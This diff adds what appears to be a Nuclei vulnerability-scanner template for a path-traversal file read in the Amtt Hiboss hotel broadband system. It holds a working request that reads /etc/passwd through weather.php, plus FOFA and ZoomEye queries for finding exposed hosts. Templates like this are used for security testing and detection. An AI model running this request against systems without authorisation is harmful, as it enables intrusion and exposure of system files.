@@ -1,0 +1,23 @@
+id: amtt-hiboss-weather-fileread
+
+info:
+  name: Amtt Hiboss weather.php - File Read
+  author: qwtd
+  severity: high
+  description: |-
+    FOFA: title=酒店宽带运营系统
+    ZoomEye: app:"安美数字酒店宽带运营系统"
+  tags: 安美数字-酒店宽带运营系统
+
+http:
+  - raw:
+      - |
+        GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - regex('root:.*:0:0:', body)
+          - status_code == 200
+        condition: and
